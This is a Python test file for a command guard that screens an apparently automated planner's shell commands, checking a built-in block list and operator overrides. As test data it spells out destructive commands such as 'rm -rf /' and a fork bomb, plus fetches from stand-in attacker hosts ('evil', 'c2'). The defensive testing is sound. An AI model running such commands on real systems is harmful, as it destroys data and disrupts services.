"""Tests for the seeded planner guard rules.

The ruleset must always include the built-in safety floor, union any operator
override onto it without ever dropping below the floor, persist the active rules
for inspection, and match both seeded verbs and substring patterns against a
candidate command.
"""

from __future__ import annotations

import json

from modules.guard_rules import GuardRules


def test_floor_blocks_destructive_defaults(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="")
    assert guard.blocks_command("rm -rf / --no-preserve-root") is True
    assert guard.blocks_command("shutdown -h now") is True
    assert guard.blocks_command(":(){ :|:& };:") is True


def test_floor_allows_normal_offensive_commands(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="")
    assert guard.blocks_command("nmap -sV 10.0.0.1") is False
    assert guard.blocks_command("curl http://10.0.0.1/robots.txt") is False


def test_override_adds_patterns(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override='{"patterns": ["curl http://evil"]}')
    assert guard.blocks_command("curl http://evil/x") is True
    assert guard.blocks_command("shutdown now") is True


def test_override_adds_verbs(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override='{"verbs": ["tcpdump"]}')
    assert guard.blocks_command("tcpdump -i eth0") is True
    assert "tcpdump" in guard.blocked_verbs()


def test_override_comma_string_is_patterns(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="telnet, http://c2")
    assert guard.blocks_command("telnet 10.0.0.1") is True
    assert guard.blocks_command("wget http://c2/x") is True


def test_malformed_override_only_keeps_floor(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="{not json")
    assert guard.blocks_command("not json pattern here") is False
    assert guard.blocks_command("reboot") is True


def test_rules_are_persisted(tmp_path):
    GuardRules("t", base_dir=tmp_path, override='{"verbs": ["tcpdump"]}')
    stored = json.loads((tmp_path / "guard_rules_t.json").read_text())
    assert "tcpdump" in stored["verbs"]
    assert "shutdown" in stored["verbs"]


def test_blocked_verbs_includes_floor(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="")
    assert {"shutdown", "reboot", "mkfs"} <= guard.blocked_verbs()


def test_empty_command_not_blocked(tmp_path):
    guard = GuardRules("t", base_dir=tmp_path, override="")
    assert guard.blocks_command("") is False
    assert guard.blocks_command("   ") is False
